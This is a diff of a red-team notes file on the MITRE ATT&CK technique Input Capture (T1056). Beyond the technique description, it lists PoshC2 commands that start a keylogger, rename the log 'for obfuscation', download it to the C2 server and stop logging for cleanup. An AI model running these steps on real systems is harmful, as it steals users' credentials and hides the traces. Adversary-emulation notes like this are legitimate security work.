@@ -1,4 +1,4 @@
-# [Input Capture]()
+# [Input Capture](https://attack.mitre.org/techniques/T1056/)
 
 ## Exploit Description: 
 Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).
@@ -15,7 +15,7 @@ start-keystrokes-writefile ##record this file location(.log)
 
 copy "C:\keystroke file location" C:\sameplace with new filename ##Change the name for obfuscation/readability
 
-Download-file C:\sameplace with new filename ## Gets put into /var/poshc2/*projectname*/downloads
+Download-file "C:\sameplace with new filename" ## Gets put into /var/poshc2/*projectname*/downloads
 
 Stop-Keystrokes ##Stop keylogger for cleanup
 
